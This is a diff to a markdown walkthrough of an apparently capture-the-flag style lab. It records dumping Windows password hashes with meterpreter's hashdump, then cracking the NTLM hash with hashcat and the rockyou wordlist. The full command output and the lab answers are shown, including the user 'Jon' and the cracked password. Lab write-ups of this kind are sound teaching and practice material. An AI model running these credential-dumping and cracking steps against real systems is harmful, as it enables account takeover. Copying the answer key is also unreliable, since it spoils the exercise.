@@ -457,7 +457,7 @@ meterpreter >
 > [!important]
 > Dump the non-default user's password and crack it!
 > 
-> Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
+> Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? Jon
 
 ```
 meterpreter > hashdump
@@ -467,3 +467,64 @@ Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 meterpreter > 
 ```
 
+> [!important]
+> Copy this password hash to a file and research how to crack it. What is the cracked password?
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nano NTLM.txt  
+
+┌──(kali㉿kali)-[~]
+└─$ hashcat -m 1000 NTLM.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #1: cpu-haswell-AMD Ryzen 5 3600 6-Core Processor, 1438/2941 MB (512 MB allocatable), 2MCU
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Hashes: 3 digests; 2 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Salt
+* Raw-Hash
+Watchdog: Temperature abort trigger set to 90c
+Host memory required for this attack: 0 MB
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 2 secs
+31d6cfe0d16ae931b73c59d7e0c089c0:                         
+ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: NTLM.txt
+Time.Started.....: Sat Feb 21 07:34:05 2026 (13 secs)
+Time.Estimated...: Sat Feb 21 07:34:18 2026 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   759.9 kH/s (0.06ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)
+Progress.........: 10200576/14344385 (71.11%)
+Rejected.........: 0/10200576 (0.00%)
+Restore.Point....: 10200064/14344385 (71.11%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: alread852 -> alposta
+Hardware.Mon.#1..: Util: 43%
+Started: Sat Feb 21 07:33:37 2026
+Stopped: Sat Feb 21 07:34:20 2026
+┌──(kali㉿kali)-[~]
+└─$ hashcat -m 1000 NTLM.txt --show
+31d6cfe0d16ae931b73c59d7e0c089c0:
+ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
+```
